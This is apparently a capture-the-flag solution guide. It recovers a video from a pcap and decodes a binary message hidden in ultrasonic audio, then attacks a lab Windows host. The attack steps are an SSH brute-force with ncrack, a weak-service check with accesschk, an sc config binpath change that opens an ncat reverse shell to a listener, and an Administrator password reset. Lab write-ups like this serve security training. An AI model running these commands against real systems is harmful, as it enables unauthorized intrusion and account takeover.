# Can't You Hear Me Knocking

_Solution Guide_

## Overview

In this challenge, you will recover a video from a pcap file, find the hidden message, and exploit a system to find the answers to the questions. This solution guide is organized by question. Question 1 is divided into two parts. In **part 1**, you'll recover the video from the pcap file found on the `analyst` system's Desktop. In **part 2**, you'll separate the audio from the video and examine the audio track.

## Question 1

*What is the "from IP" given in the hidden message?*

### Part 1: Recover the video from the pcap file

1. Open the pcap file (**Suspect.pcapng**) using Wireshark.
2. Filter by **udp** because you are looking for a streaming video.
3. Go to **Statistics**, **Conversations**. This will help find the transfer. 
4. On the **Conversations UDP** tab, sort on the  **Bytes** or **Packets** column. There is a 15 M transfer between two IP addresses on port 1099.

<img src="img/c49-img1.png">

5. Filter on **udp.port==1099**. The first packet sent is a Matroska (`.mkv`) video file.

<img src="img/c49-img2.png">

5. Right-click any packet and select **Follow > UDP Stream**.
6. Change the **Show data as** dropdown to **Raw**, then **Save as...** *AnyName*.mkv.
7. Watch the video to verify it is the file you're looking for.

<img src="img/c49-img3.png">

### Part 2: Separate audio from video and review

1. In **VLC media player** select **Media, Convert/Save**. Drag the `mkv` file into the Open Media window and select **Convert/Save**.
2. We want to capture an uncompressed audio format, so: for **Profile**, select the **Audio - FLAC**. In **Destination file:**, choose a *filename*.flac and click **Start**.
3. Open the new `.flac`file in **Audacity**.
4. Look at the wave form display. Notice there are a series of loudness spikes at regular intervals.  

<img src="img/c49-img4.png">

5. Open the **Spectrogram** view. It shows the spikes are a much higher frequency tone than the rest of the audio in the file. Examining the frequency analysis (highlight the audio, **Analyze**, **Plot Spectrum**) shows sound at the top of the human hearing range (20,000 Hz).

<img src="img/c49-img5.png">

6. Zooming in on the spikes shows they are in intervals of eight spikes, with a gap in between each group of eight. This tells you it's binary. 
7. Using the left and right channels (the top and bottom of the display respectively) to determine **0/1** will give you the following binary string:
**01010100 01101111 01101011 01100101 01101110 00100000 01100001 01110100 00100000 00110001 00110000 00101110 00110101 00101110 00110101 00101110 00110001 00110000 00110001 00100000 01100001 01100011 01100011 01100101 01110011 01110011 00100000 01100110 01110010 01101111 01101101 00100000 00110001 00110000 00101110 00110101 00101110 00110101 00101110 00110110 00110101**

8. Converting this string to text reveals the secret message and the answer to Question 1: `10.5.5.65`.

<img src="img/c49-img6.png">

## Question 2

*What is the text value in the token file at C:\token\token\token1*

1. Change the `analyst` VM IP address to **10.5.5.65**.
2. Run `sudo nmap` against **10.5.5.101**. Several services running on open ports are revealed. 

<img src="img/c49-img7.png">

3. Crack the username and password with the supplied wordlist (**wordlist.txt**). For the purposes of this solution guide, we'll crack the ssh login.

```
ncrack -U /home/user/Desktop/wordlist.txt -P /home/user/Desktop/wordlist.txt 10.5.5.101:22
```
4. Once credentials are obtained, you can access **10.5.5.101**. We'll use `rdesktop`. There is a token file at **C:\token\token**\.  This folder is also a network share.  However, you can't open the token.

5. Escalate privilege to an admin account to get the token. Open a Command Prompt (**run as administrator**) and use the **Sysinternals AccessCheck** app found in `C:\ProgramData\chocolatey\bin\ ` to find an unsecured service. Run: `accesschk.exe -uwcqv "spokesman" *`

<img src="img/c49-img8.png">

6. Back on the `analyst` VM, open a `netcat` listener (we're using port 99): `nc -klp 99`
7. On the *Windows machine*, in your Command Prompt, point the service to open a reverse shell:

```
sc config service2 binpath="C:\Program Files (x86)\Nmap\ncat.exe 10.5.5.65 99 --exec cmd.exe"
```
8. Start the service: `net start service2`. This gives you a Command Prompt in the terminal where the `netcat` listener is running. The service will timed out so you need to work quickly.

<img src="img/c49-img9.png">9. In the reverse shell, reset the **Administrator** account password: `net user Administrator NewPass`

<img src="img/c49-img10.png">

​	Alternatively, you could add the **spokesman** account to the Administrators group: 

​	`net localgroup Administrators spokesman /add`

10. With Administrator access, ssh in with the credentials and access the token file.<img src="img/c49-img11.png">
